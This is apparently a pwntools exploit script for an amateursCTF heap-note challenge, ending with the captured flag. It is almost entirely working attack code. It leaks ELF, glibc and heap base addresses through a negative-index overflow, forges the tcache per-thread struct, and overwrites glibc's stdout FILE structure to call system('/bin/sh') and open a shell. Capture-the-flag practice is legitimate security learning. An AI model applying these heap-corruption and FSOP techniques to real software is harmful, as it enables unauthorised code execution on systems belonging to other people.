from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    # b *__libio_codecvt_in+0x82
    continue
''')

# p = remote('amt.rs', 26797)

# malloc a chunk of size at index with data
def create_note(index, size, data):
    p.sendlineafter(b"which operation: ", b'1')
    p.sendlineafter(b"which note: ", str(index).encode())
    p.sendlineafter(b"size: ", size)
    p.sendafter(b"data: ", data)

# free a chunk at index, set its pointer to NULL
def free_note(index):
    p.sendlineafter(b"which operation: ", b'2')
    p.sendlineafter(b"which note: ", str(index).encode())

# view a chunk at index, print out a string starting from chunk (integer overflow possible if appropriate)
def view_note(index):
    p.sendlineafter(b"which operation: ", b'3')
    p.sendlineafter(b"which note: ", str(index).encode())
    p.recvuntil(b"data: ")
    return p.recvline().strip()

e = ELF('./chal')
glibc_e = ELF('./libc.so.6')

# Stage 1: leak elf base address through integer overflow
elf_base_addr = u64(view_note(-7).ljust(8, b'\x00'))-e.symbols['__dso_handle'] # elf_base_addr+e.symbols['__dso_handle']
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 2: leak glibc base address and heap base address
create_note(0, b'418', b'0') # heap_base_addr+0x1020
create_note(1, b'18', b'1') # heap_base_addr+0x1040
free_note(0) # heap_base_addr+0x1020
create_note(0, b'18', b'0'*8) # heap_base_addr+0x1020
glibc_base_addr = u64(view_note(0)[8:].ljust(8, b'\x00'))-(glibc_e.symbols['main_arena']+1104) # heap_base_addr+0x1020
log.info(f"glibc base address: {hex(glibc_base_addr)}")
free_note(0) # heap_base_addr+0x1020
create_note(0, b'18', b'0'*0x10) # heap_base_addr+0x1020
heap_base_addr = u64(view_note(0)[0x10:].ljust(8, b'\x00'))-0x1010 # heap_base_addr+0x1020
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 3: exploit tcache perthread struct through integer overflow to attach stdout for fsop
create_note(2, b'18', p64(heap_base_addr+0x1440)) # heap_base_addr+0x1040
free_note(((heap_base_addr+0x1040)-(elf_base_addr+e.symbols['notes']))//8) # heap_base_addr+0x1440
class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [7]*76
        self.pointers = [0]*76
    def set_count(self, size, count):
        idx = (size - 0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size - 0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=6):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        output = b""
        for count in self.counts:
            output += p16(count)
        for pointer in self.pointers:
            output += p64(pointer)
        return output
fake_tcache = TcachePerthreadStruct()
fake_tcache.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
create_note(3, b'2f8', bytes(fake_tcache)) # heap_base_addr+0x1440
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_buf_base = u64(b'/bin/sh\x00')
fake_file._IO_backup_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x28)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
create_note(4, b'f8', bytes(fake_file)) # glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']

p.interactive()

# amateursCTF{libc_is_just_weird_sometimes}